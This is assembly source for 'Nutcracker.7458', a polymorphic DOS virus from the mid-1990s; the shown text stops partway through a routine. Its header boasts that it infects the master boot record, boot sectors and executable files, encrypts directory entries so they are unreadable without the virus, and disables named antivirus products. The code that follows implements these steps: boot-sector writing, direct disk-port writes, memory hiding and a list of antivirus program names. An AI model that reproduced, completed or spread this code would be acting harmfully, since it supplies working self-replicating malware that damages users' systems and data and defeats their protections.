   ;      Nutcracker.7458
   ;<C> 1995-7 by Lord Nutcracker
   ;poly mbr/boot/com/exe/sys/bin

   ;Notez:
   ; 1. poly in all attackin objectz
   ; 2. original (small exe)&com&sys&bin infection method
   ; 3. encrypt dir-entriez on-the-fly (usin int0 bios address as mask, i.e.
   ;    decryptin without present virus in ram iznt possible) on 1st hd
   ; 4. semi-stealth on philez, *-stealth on hd
   ; 5. two decryptor typez on philez (multi- max 29!&one main)
   ; 6. two attack mode:
   ;  6.1 mbr-mode (attack philez on floppiez,network drivez,with 1/4 probablity
   ;        on hd when creatin)
   ;  6.2 phile-mode (attack all philez on all drivez)
   ; 7. livin in novell network
   ; 8. hack AdInf (see int_2fh_handler)
   ; 9. smash when run phuckin VirusBlockAda (see int_2fh_handler)
   ;10. unvisible in memory (adding 2 dos kernel mcb)
   ;11. antiemul trickz (callin&checkin obsolete dos fn and int13h fn)
   ;12. writin 2 hd from portz programmin (100% compatible with any at contr)
   ;13. difficult condition activisation (4 more hidin) - week&bios crc checkin
   ;14. 100% correct decryptorz generatin
   ;15. many garbagin instruction
   ;16. non-standard floppy ext track formattin
   ;17. on 12th january print screen callin :-)
   ;18. locked any mbr-placed av&protect software
   ;19. smart hookin intz (anti drweb-tracer)
   ;20. effective asm programmin

   ;Warninz:
   ; 1. dont correct code, length dependence!
   ; 2. tasm /M option needed when assemblin!

   DEBUG       equ 0           ;0-none, 1-file or 2-boot debug
   SECTORS     equ (Len_Const+LenMBR*2+1FFh)/200h
   WAITIME     equ 1
   MemBaseBoot13h  equ 500h-2
   MemBase13h  equ 10h-6
   MemBase21h  equ 10h-4
   MemBase2Fh  equ 10h-2
   LenMBR      equ 111
   CntDec      equ 29
   CntCom      equ 16
   v13h        equ 13h
   v21h        equ 21h
   v2Fh        equ 2Fh
   LenCrpt     equ ReadCyl
   DskBuffer   equ Encryptor

   model tiny
   .code

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Start:
       db  15 dup (90h)        ;15x NOP's
       mov dl,0
       nop
       clc
       nop
       mov ah,0Ah
       nop
       int 13h
       nop
       cmc
       nop
       jc  $
       cli
       mov bx,0
       nop
       mov es,bx
       les bx,dword ptr es:[0Ch]
       mov ah,es:[bx]
       mov bx,8000h
       nop
       mov cx,Len_Const
       nop
   EncMyself:
       and ah,0
       xor cs:[bx+0AA55h],ah
       add bx,1
       nop
       nop
       sub cx,1
       nop
       nop
       jnz EncMyself
   LenMainEnc  equ $-Start
   Continue:
       sub di,di
       jmp $+2
   OffJumpSYS  equ $-Start-1
   JumpSYS     equ byte ptr $-1
       mov ax,cs
       mov ss,ax
   OffDriver   equ $-JumpSYS-1
   CorrStck    db  90h     ;NOP(POP AX)
       call    Main

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   BuffHere    equ $-Start
   BuffCorrStck    equ $-CorrStck
   BuffJumpSYS equ $-JumpSYS
   Buffer      db  8 dup (?)
   OffHere     equ $-Start
   OffBuff     dw  0
   SS_Here     equ $-Start
   StoreSS     dw  0FFF0h
   StoreSP     dw  0FF00h
   StoreIP     dw  0
   CS_Here     equ $-Start
   StoreCS     dw  0FFF0h
   Logo        label   byte
       IRPC    Char,Nutcracker
           db  '&Char&' xor 0ABh
       ENDM

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   GoBOOT      equ $-JumpSYS-1
       cld
       push    cs
       pop ds
       les ax,dword ptr ss:[di+13h*4]
       mov save_13h_off_old,ax
       mov save_13h_seg_old,es
       les ax,dword ptr ss:[40h*4]
       mov save_40h_off_old,ax
       mov save_40h_seg_old,es
       cmp byte ptr [di],0
       org $-1
       cld
       jne BodyCrypt
       push    cs
       pop es
       mov dx,80h
       call    MutationBootBody
   BodyCrypt:
       mov bx,7C00h
       mov cx,LenMBR
       mov dx,ReadHead
       push    ss bx dx ss ss ss
       pop ds es
       mov ds:[21h*4+3],bh
       test    dl,dl
       js  ItsMBR
       call    ScanJump
       lea di,[bx+si]
       lea si,DskBuffer
       push    cs
       pop ds
       rep movsb
       or  IntoMBR,-1
       call    WriteMBR
       jnc Install2Memory
       lea ax,Install2Memory
       push    ax
   NoCryptDir:
       mov cs:Jump13h,NonDsk
       IF  DEBUG EQ 0
       dec cs:FileFloppy
       ELSE
       db  5 dup (90h)
       ENDIF
       retn
   ItsMBR:
       mov si,7C00h+1BEh
       mov cl,4
   FindActive:
       lodsw
       cmp al,80h
       je  FoundActive
       add si,0Eh
       loop    FindActive
   RomBasic:
       int 18h
   FoundActive:
       mov cx,201h
       xchg    dx,ax
       lodsw
       xchg    cx,ax
       int 13h
       jc  RomBasic
   Install2Memory:
       pop ds
       mov ax,ds:[0]
       mov cs:MaskXOR,ax
       mov di,MemBaseBoot13h
       call    Hook13h
       pop dx
       retf

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   SegPush     db  6,1Eh
   CorrSeg     label   byte
   CodeTable   db  0Eh,16h
   Len_Seg     equ $-SegPush
           db  0CDh,7Bh,0EBh,0CCh,0A8h,70h,0E9h,0CEh
           db  0B4h,91h,41h,0CDh,7Dh,72h,79h,3Dh,0BAh
   SysPush     db  9Ch,50h,51h,52h,53h,55h,56h,57h,6,1Eh
   LenSysPush  equ $-SysPush
   JmpCycleUp  db  75h,7Fh,77h
   LenJmpCycleUp   equ $-JmpCycleUp
   JmpCycleDown    db  74h,0E3h,7Eh,76h
           db  0CDh,7Ah,7Ch,3Ch,0BDh,71h,0E8h
           db  54h,73h,78h,0B2h,0E8h,0A9h
           db  0CDh,0Eh,0EBh,0B6h,0E9h
   LoopTable   db  0CCh
   BooTable    db  0FBh
   MainGarbage db  0FDh,0FCh,0F5h,0F8h,0F9h,9Eh,0FAh
   PrefixGarbage   db  26h,2Eh,36h,3Eh,90h
   LenLoader   equ $-BooTable
   LenPrefixGarbage equ    $-PrefixGarbage
           db  9Fh,98h,99h,40h,42h,43h,45h,46h,47h,92h,93h,95h,96h,97h
   Len_Code    equ $-CodeTable
           db  0D7h,27h,37h,2Fh,3Fh
   CmpTable    db  0A6h,0AEh,0ACh
   LenCmp      equ $-CmpTable
   LenMainGarbage  equ $-MainGarbage
   Len4Loop    equ $-LoopTable
   FunNone     db  -1
           db  0E0h,4,0B0h,2Ch,0E1h,5,-1,0B1h,2Dh,0E2h,14h,0B3h,0E4h,-1
           db  15h,0B4h,0E5h,0D4h,-1,24h,0B5h,0D5h,25h,0B7h,-1,34h,0D6h,0B8h
           db  35h,-1,0B9h,0Ch,0BBh,0Dh,0F2h,-1,0BEh,1Ch,0F3h,0BFh,1Dh,-1
   Len_CodeBig equ $-CodeTable
   IntTable    db  1,3,4,2Bh,2Ch,2Dh,35h,36h,37h,38h,39h,3Ah,3Bh,3Ch,3Dh,3Eh,3Fh
   MoveOpCodes db  34h
   Len_Int     equ $-IntTable
           db  0Ch
   MaskTable   dw  0FF04h,0FF24h,0C7FEh,0BFFEh,0D7F6h,0CFF6h,0FF0Ch,0BFD0h,0BFD2h,0C7D0h
           dw  0C7D2h,0FF34h,0DFD0h,0E7D0h,0FF2Ch
   Len_Mask    equ $-MaskTable
   TrickFn2    db  9,0Ah,0Bh,0Eh,0Fh
   LenTrickFn2 equ $-TrickFn2
   IntTable2   db  8,10h,11h,12h,13h,15h,16h,1Ah,1Ch,21h,28h,2Ah
   Len_Int2    equ $-IntTable2
   FunOffst    dw  FunNone,Fun10h,FunNone,FunNone,Fun13h,Fun15h,Fun16h,Fun1Ah,FunNone
           dw  Fun21h,FunNone,Fun2Ah
   Fun10h      db  5,3,4,8,0Dh
   Fun21h      db  15,0Bh,0Dh
   TrickFn     db  18h,1Dh,1Eh,20h,61h
   LenTrickFn  equ $-TrickFn
           db  19h,2Ah,2Ch,30h,4Dh,51h,54h,62h
   Fun16h      db  6,1,9,0Ah,11h,12h
   Fun13h      db  2,10h
   Fun15h      db  1,88h
   Fun1Ah      db  5,2,4,9,0Ah
   SegRegTable db  0,3 shl 3,2 shl 3
   PopTable    db  7,1Fh,17h
   Len_Pop     equ $-PopTable
   Num10h      label   word
   SpecTable1  db  10h,0,38h,84h,88h,18h,8,20h,86h,8Ch,8Dh
   CrypTable   db  28h,30h
   Len_Spec1   equ $-SpecTable1
   SpecTable2  dw  0D0h
           db  0F6h
   Len_CT      equ $-CrypTable
           db  10h
           dw  8D0h,2080h,18F6h,880h,0D2h,8D2h,2880h,3080h,0FEh,8FEh
   Len_Chng    equ $-SpecTable2
           dw  3880h,0F6h,1080h,80h,10D0h,18D0h,10D2h,18D2h,20D0h,20D2h
           dw  38D0h,38D2h,28D0h,28D2h,1880h
   Len_Spec2   equ $-SpecTable2
           dw  20F6h,28F6h
   Len_Spec2All    equ $-SpecTable2
   TimeMask    label   word
           db  1Eh
   MyTable     db  0
   RegTable    db  4
   RegTable1   db  2,3,6,7
   LenMyTable  equ $-MyTable
           db  5
   LenReg      equ $-RegTable
   LenReg1     equ $-RegTable1
   OffsNOP     dw  SimpleNOP3,SimpleNOP2,SimpleNOP1
   WorkRegTable    dw  0000010000000110B       ;SI
           dw  0000010100000111B       ;DI
           dw  0000011100000011B       ;BX
           dw  0000011000000101B       ;BP
   CommandTable    dw  MovES,ZeroBX,MovDX,MovCX,ZeroAH,MovAX
   LenCommand  equ $-CommandTable
   EndCommand  dw  CD13h
   Dbl     MACRO   String
           Slength =   0
       IRPC    Char,String
           Slength =   Slength+1
       ENDM
           db  Slength
       IRPC    Char,String
           db  '&Char&' xor 0ABh
       ENDM
           ENDM
   NameTable1  label   byte
           dbl TB
           dbl -V
           dbl NAV
           dbl AVP
           dbl VIR
           dbl NOD
           dbl IBM
           dbl VSH
           dbl RKS
           dbl CPA
           dbl SCA
           dbl ADI
           dbl F-P
           dbl AIDS
           dbl GUAR
           dbl DESI
           dbl CHKV
           dbl VIVE
           dbl CLEA
           dbl FINDV
           dbl SETVE
           dbl COMMA
   NameWin     label   byte
           dbl WIN
   NameTable2  label   byte
           dbl CHKLI
           dbl ANTI-V
           dbl SMARTCH
   NameSpec1   label   byte
           dbl PK
           dbl HA
           dbl AIN
           dbl CHKDS
   NameSpec2   label   byte
           dbl WEB
           dbl DRWE
   NameSpec3   label   byte
           dbl NET
           dbl VLM
           dbl ANET
           dbl BNET
           dbl EMSNE
           dbl XMSNE
   NameSpec4   label   byte
           dbl VBA
   NameCOM     label   byte
           dbl COM
           dbl EXE
   NameSYS     label   byte
           dbl SYS
           dbl BIN
   PrtBuff     db  ?
   SCount      db  ?
           db  ?,0,0,0A0h,30h

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   SYSret:
       call    Install
       jnc ExecDrv
       call    HookFile
   ExecDrv:
       pop di si ds es
       call    SubXOR
       rep movsb
   SysPop  db  1Fh,7,5Fh,5Eh,5Dh,5Bh,5Ah,59h,58h,9Dh   ;POP's
       db  0EAh            ;JMP ????:????
   OffSYS  dw  ?
   SegSYS  dw  ?

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   MainGoto:
       call    Install
       call    Stay2Mem
       pop si
       mov ds,bp
       mov es,bp
       mov di,100h
       push    di si
       lea si,[si+BuffHere]
       call    CheckExeSign
       movsw
       movsw
       movsw
       movsw
       mov si,[si]
       pop di
       pushf
       call    SubXOR
       rep movsb
       popf
       pop si
       jne Return
       mov di,si
       mov cx,[si+6]
       jcxz    NoReloc
       add bp,10h
       add si,[si+18h]
   NextReloc:
       lodsw
       xchg    bx,ax
       lodsw
       add ax,bp
       add ax,[di+8]
       mov es,ax
       add es:[bx],bp
       loop    NextReloc
   NoReloc:
       mov ax,[di+4]
       mov cl,9
       shl ax,cl
       mov si,[di+8]
       mov cl,4
       shl si,cl
       sub ax,si
       add si,di
       push    ss ax
       add ax,di
       shr ax,cl
       add ax,[di+0Ch]
       pop cx es
       rep movsb
       jbe NoAdjust
       xchg    bx,ax
       mov ah,4Ah
       int 21h
       jc  NoAdjust
       mov ax,ds
       add ax,bx
       mov ds:[2],ax
   NoAdjust:
       lea di,StoreSS
       mov bp,cs:[di+6]
       mov si,cs:[di+4]
       cli
       mov ss,cs:[di]
       mov sp,cs:[di+2]
   Return:
       mov ax,202h
       sub bx,bx
       mov cx,0FFh
       mov dx,ds
       mov di,sp
       push    ax
       mov ax,bx
       push    bp si
       iret

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Main:
       mov bp,sp
       inc sp
       inc sp
       cld
       sub word ptr [bp+di],BuffHere
       mov si,[bp+di]
       push    cs
       pop ds
       mov cx,[si+OffHere]
       cmp byte ptr [si+OffJumpSYS],0
       jne SubSYS
       mov ah,51h
       int 21h
       mov bp,bx
       add bx,10h
       add [si+SS_Here],bx
       add [si+CS_Here],bx
       jcxz    BigEXE
       add cx,SaveLen[si]
       mov ax,cx
       add cx,Len_Const+LenMBR+4FDh
       cmp cx,sp
       jae NoPrs
       mov cl,4
       shr ax,cl
       stc
       adc ax,bp
       lea bx,MainGoto
       jmp AllType
   BigEXE:
       call    Install
       call    Stay2Mem
       mov ds,bp
       mov es,bp
       jmp NoAdjust
   SubSYS:
       mov word ptr ds:[6],0
   SaveSYS     equ word ptr $-2
       mov SegSYS[si],cs
       push    cs cs cx
       mov ah,6Ah
       int 13h
       lea bx,SYSret
       jnc AllType
       mov ah,6Dh
   AllType:
       push    si
       mov es,ax
       mov cx,Len_Const
   SaveLen     equ word ptr $-2
       rep movsb
   CommonGoto:
       push    es bx
       retf

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Stay2Mem:
       jnc NoPrs
       call    Stay
       jcxz    OkayStay
       mov es,bp
       dec bp
       mov ds,bp
       inc bp
       mov ax,ds:[3]
       sub ax,(Common_Len+0Fh)/10h+1
       jbe NoPrs
       xchg    bx,ax
       mov ah,4Ah
       int 21h
       jc  NoPrs
       sub word ptr ds:[12h],(Common_Len+0Fh)/10h+1
       call    Stay
   OkayStay:
       lea bx,HookFile
       jmp CommonGoto

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Get1stMCB:
       mov ah,52h
       int 21h
       mov ds,es:[bx-2]
   NoPrs:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Install:
       mov ah,6Ah
       int 13h
       jnc NoPrs
       call    ChkSumBIOS
       cmp ax,0
   CrcBIOS     equ word ptr $-2
       je  NoChkDate
       mov ah,2Ah
       int 21h
       cmp cl,1980 and 0FFh
       je  NoChkDate
       xchg    dx,ax
       cmp ax,10Ch
       jne NoMagicDate
       int 5
   NoMagicDate:
       and al,00011000b
       cmp al,55h
   DayX        equ byte ptr $-1
       je  NoPrs
   NoChkDate:
       mov ah,13h
       int 2Fh
       lea di,save_13h_off_old
       mov cs:[di],dx
       mov cs:[di+2],ds
       mov ah,13h
       int 2Fh
       mov ax,3540h
       int 21h
       mov cs:[di-off_save_40h_off_old],bx
       mov cs:[di-off_save_40h_seg_old],es
       sub bx,bx
       mov ax,160Ah
       int 2Fh
       mov al,0EBh         ;JMP SHORT
       cmp bh,4
       jae UnderHsFlop

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   WriteMBR:
       mov al,75h          ;JNE
   UnderHsFlop:
       mov dx,80h
       push    dx cs cs
       pop ds es
       mov TurnFloppy,al
       sub ax,ax
       mov CheckJump,al
       mov MemMove,al
       mov Jump13h,al
       mov Jump21h,al
       dec ax
       mov WhichHandle,ax
       mov FileFloppy,0
       org $-1
       stc
       mov FreeMem,NoFree
       mov JumpSYS,GoBOOT
       xor WhichOwn,78h
       mov ah,8
       int 13h
       pop dx
       jc  ErrWriteNear
       xchg    cx,ax
       mov StoreCyl,ax
       and ax,3Fh
       sub al,SECTORS-1
       jc  ErrWriteNear
       mov ReadCyl,ax
       mov BegSec,al
       mov ReadHead,dx
       dec ax
       jz  ComplmCarry
       mov cl,1
       lea bx,DskBuffer
       mov ax,201h
       call    Int_13h
       jc  ErrWriteShort
       lea si,DskBuffer+1BEh+4
       dec cx
   NextPart:
       lodsb
       cmp al,1
       jb  NoActive
       je  CheckPart
       cmp al,4
       jb  ErrWriteShort
       cmp al,6
       ja  ComplmCarry
   CheckPart:
       cmp [si-4],ah
       jne GetPart
       test    word ptr [si-3],0FFC0h
       jz  ComplmCarry
   GetPart:
       cmp [si-5],dl
       jne NoActive
       test    cx,cx
       jnz ComplmCarry
       mov dh,[si-4]
       mov cx,[si-3]
   NoActive:
       add si,0Fh
       cmp si,offset DskBuffer+1FEh
       jb  NextPart
       jcxz    ComplmCarry
       push    bx
       mov ax,201h
       add bh,ah
       call    Int_13h
       pop bx
   ErrWriteNear:
       jc  ErrWriteShort
       mov dh,0
       cmp word ptr [si+5-2],'IW'  ;W95 ?
       je  ComplmCarry
       cmp word ptr [si+4-2],'2S'  ;OS2 ?
       je  ComplmCarry
       xor [si-45h],dl
       IF  DEBUG EQ 1
       jmp ComplmCarry
       ELSE
       jns AlreadyInf
       ENDIF
       call    ScanJump
       cmp si,200h-LenMBR-23h-42h-1
   ComplmCarry:
       cmc
   ErrWriteShort:
       jc  ErrWriteVeryShort
       sub di,di
       mov cx,LenMainEnc
       mov al,0
       org $-1
       cld
       rep stosb
       lea di,[bx+si]
       mov cl,23h
       repne   scasb
       je  InstFound
       lea di,[bx+si+1]
   InstFound:
       lea si,[di-1]
       lea di,MBRBuffer
       call    BootMutation
       mov IntoMBR,ax
       mov cx,ReadCyl
       push    bx
       sub bx,bx
       call    Int_13h_body

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   WriteLoader:
       pop bx
   ErrWriteVeryShort:
       jc  ErrWrite
       mov cx,1

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Int_13h_one:
       mov al,1
       cmp ax,0
       org $-2

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Int_13h_body:
       mov al,SECTORS
       test    dl,dl
       jns Int_13h_write
       push    ax cx dx ds
       call    PrtWrite
       pop ds dx cx ax
   AlreadyInf:
       jnc ErrWrite

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Int_13h_write:
       mov ah,3

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Int_13h:
       push    ds
       mov di,9
       mov ds,di
       push    word ptr [di+40h*4-90h-9]
       push    word ptr [di+40h*4+2-90h-9]
       cli
       mov word ptr [di+40h*4-90h-9],0
   save_40h_off_old    equ word ptr $-2
       mov word ptr [di+40h*4+2-90h-9],0
   save_40h_seg_old    equ word ptr $-2
       pushf
       db  9Ah         ;CALL ????:????
   off_save_40h_off_old    equ $-save_40h_off_old
   off_save_40h_seg_old    equ $-save_40h_seg_old
   save_13h_off_old    dw  ?
   save_13h_seg_old    dw  ?
       pop word ptr [di+40h*4+2-90h-9]
       pop word ptr [di+40h*4-90h-9]
       pop ds
   ErrWrite:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   WriteFloppy:
       push    es
       pop ds
       test    byte ptr [bx+1FDh],80h
       jnz ErrWrite
       cmp byte ptr [bx+18h],SECTORS
       jb  ErrWrite
       cmp word ptr [bx+1FEh],0AA55h
       jne ErrWrite
       call    ScanJump
       cmp si,1Eh
       jb  ErrWrite
       cmp si,200h-LenMBR-3
       ja  ErrWrite
       call    Int_13h_one
   ErrWriteBoot:
       jc  ErrWrite
       push    cs
       pop es
       xchg    bx,ax
       xchg    si,ax
       lea di,Decrypt+LenMBR*2
       add ax,di
       mov ch,2
       push    ax di cs
       rep movsb
       mov ds,cx
       mov bl,10h
       lds si,dword ptr [bx+1Eh*4-10h]
       push    ds si cx cs
       lea di,BaseTable
       push    di
       mov cl,0Bh
       rep movsb
       mov ds,cx
       pop word ptr [bx+1Eh*4-10h]
       mov [bx+1Eh*4+2-10h],cs
       mov cl,SECTORS
       mov bh,2
       or  bl,ds:[46Ch]
       sub bl,cl
       pop ds
       mov byte ptr [di-4],54h
       mov [di-7],cl
       lea di,MainBuffer
       push    di
       IF  DEBUG EQ 0
       mov ax,50h
       ELSE
       mov ax,4Fh
       ENDIF
   FillFrmtBuff:
       stosw
       xchg    bx,ax
       stosw
       xchg    bx,ax
       inc bx
       loop    FillFrmtBuff
       pop bx
       mov ch,al
       inc cx
       mov ax,500h+SECTORS
       call    Int_13h
       mov cl,[bx+2]
       mov ReadCyl,cx
       pop si
       mov ReadHead,si
       mov ds,si
       pop word ptr [si+1Eh*4]
       pop word ptr [si+1Eh*4+2]
       pop ds bx si
       jc  ErrWriteBoot
       or  byte ptr [bx+1FDh],80h
       lea di,DskBuffer
       call    BootMutation
       mov JumpSYS,GoBoot
       lea ax,WriteLoader
       push    bx ax
   MutationBootBody:
       push    ReadCyl
       push    dx
       mov CLDorCLI,0
       org $-1
       cld
       call    RandByte
       add ax,Len_Const+LenMBR*2
       mov SaveLen,ax
       call    MutationZeroOff
       pop dx cx
       lea bx,MainBuffer
       jmp Int_13h_body

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   PrtWrite:
       lea si,PrtBuff
       mov ah,cl
       mov [si+1],ax
       mov cl,2
       mov ds,cx
       push    ds
       lds di,dword ptr ds:[41h*4-20h]
       mov ax,[di+5]
       shl ax,cl
       mov cs:[si],al
       mov ax,0
   StoreCyl    equ word ptr $-2
       rol al,cl
       and al,3
       xchg    ah,al
       sub ax,[di]
       inc ax
       inc ax
       xchg    cx,ax
       mov al,[di+8]
       pop ds
       jnz RetErr
       mov dx,3F6h
       cli
       out dx,al
       mov dx,1F7h
   TestBusy:
       in  al,dx
       test    al,80h
       loopnz  TestBusy
       jnz RetErr
       mov dl,0F0h
       mov cx,7
   NextOut:
       inc dx
       lods    byte ptr cs:[si]
       out dx,al
       loop    NextOut
   CheckBusy:
       in  al,dx
       test    al,8
       loopz   CheckBusy
       jnz NoRetErr
   RetErr:
       stc
       retn
   NoRetErr:
       lea ax,Int_76h_entry
       xchg    ax,ds:[76h*4-20h]
       push    ax
       mov ax,cs
       xchg    ax,ds:[76h*4+2-20h]
       push    ax
       mov si,bx
   WriteNextSector:
       mov dl,0F0h
       mov cx,100h
       mov cs:JumpStatus,-JumpWait
   NextWriteWord:
       lods    word ptr es:[si]
       out dx,ax
       loop    NextWriteWord
       mov ax,ds:[46Ch-20h]
       dec ax
       sti
   WaitWrite:
       push    ax
       sub ax,ds:[46Ch-20h]
       cmp ax,-(WAITIME*18+1)
       pop ax
       jb  WasErr
       jmp WaitWrite
   JumpStatus  equ byte ptr $-1
   JumpWait    equ $-WaitWrite
       cli
       dec cs:SCount
       lahf
       mov dl,0F7h
       in  al,dx
       test    al,88h
       jnz Busy
       test    al,1
       jz  NoWasErr
       mov dl,0F1h
       in  al,dx
       test    al,al
       jnz WasErr
   NoWasErr:
       sahf
       jnz WasErr
       jmp OkWrite
   Busy:
       sahf
       jnz WriteNextSector
   WasErr:
       stc
   OkWrite:
       pop word ptr ds:[76h*4+2-20h]
       pop word ptr ds:[76h*4-20h]
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Int_76h_entry:
       push    ax
       mov al,20h
       out 0A0h,al
       mov cs:JumpStatus,0
       out 20h,al
       pop ax
       iret

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   ScanJump:
       sub si,si
       mov ax,[bx]
       cmp al,0E9h         ;JMP NEAR
       je  ItsJumpNear
       cmp al,0E8h         ;CALL NEAR
       je  ItsJumpNear
       cmp al,0EBh         ;JMP SHORT
       jne NoJumpCall
       mov al,ah
       cbw
       jmp NearShort
   ItsJumpNear:
       mov ax,[bx+1]
       inc ax
   NearShort:
       xchg    si,ax
       lodsw
   NoJumpCall:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   FindName:
       mov si,dx
       push    si
   NextScanPath:
       lodsb
       cmp al,':'
       je  StorePath
       cmp al,'\'
       jne NoStorePath
   StorePath:
       mov dx,si
   NoStorePath:
       test    al,al
       jnz NextScanPath
       pop si
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Stay:
       push    cs
       pop ds
       sub di,di
       mov si,di
       mov ax,4300h
       int 2Fh
       cmp al,80h
       jne NoXMS
       mov ax,4310h
       int 2Fh
       xchg    bx,ax
       lea bx,save_XMS_entry
       mov [bx],ax
       mov [bx+2],es
       mov dx,(Common_Len+0Fh)/10h
       mov ah,10h
       call    dword ptr [bx]
       xchg    bx,ax
       dec ax
       dec bx
       jz  OkAlloc
   NoXMS:
       mov ax,5800h
       int 21h
       push    ax
       mov ah,30h
       int 21h
       sub bx,bx
       cmp al,5
       jb  BestFitLow
       mov bl,80h
   BestFitLow:
       mov ax,5801h
       push    ax
       int 21h
       mov ax,5802h
       int 21h
       cbw
       push    ax
       mov bl,1
       mov ax,5803h
       push    ax
       int 21h
       mov bx,(Common_Len+0Fh)/10h
       mov ah,48h
       int 21h
       dec ax
       xchg    dx,ax
       sbb cx,cx
       jnz NoAlloc
       call    Get1stMCB
       mov ax,ds
       call    CheckMCB
       jne ScanMCB
       cmp word ptr [di+8],'DS'
       jne ItsKernelMCB
       push    ds
       mov ax,ds
       inc ax
   FindLastSubMCB:
       call    CheckMCB
       jne FindLastSubMCB
       pop ax
       cmp byte ptr [di],'T'
       je  NoAlloc
   ScanMCB:
       call    CheckMCB
       jne ScanMCB
       cmp word ptr [di+1],8
       jne NoAlloc
       cmp word ptr [di+8],'CS'
       je  ItsKernelMCB
       cmp word ptr [di+8],'DS'
       jne NoAlloc
   ItsKernelMCB:
       mov si,ds
   NoAlloc:
       pop ax bx
       int 21h
       pop ax bx
       int 21h
       xchg    dx,ax
       jcxz    OkAlloc
       retn
   OkAlloc:
       mov bx,cs
       dec bx
       mov ds,bx
       inc bx
       mov es,ax
       inc ax
       mov word ptr es:[di+1],8
   WhichOwn    equ byte ptr $-2
       jmp $
   FreeMem     equ byte ptr $-1
       mov cl,0A0h
       cmp bh,cl
       jb  NoUpMCB
       cmp ah,cl
       jb  FreeMCB
   CompMCB:
       cmp bx,ax
       ja  TakeMCB
   FreeMCB:
       mov es:[di+1],di
       retn
   NoUpMCB:
       cmp ah,cl
       jb  CompMCB
   TakeMCB:
       mov [di+1],di
   NoFree      equ $-FreeMem-1
       cmp si,di
       je  NoHideMCB
       mov byte ptr ds:MemMove+10h,MemMoveOff
       mov ds,si
       add word ptr [di+3],(Common_Len+0Fh)/10h+1
   NoHideMCB:
       push    cs
       pop ds
       mov es,ax
       mov si,di
       mov FreeMem,ch
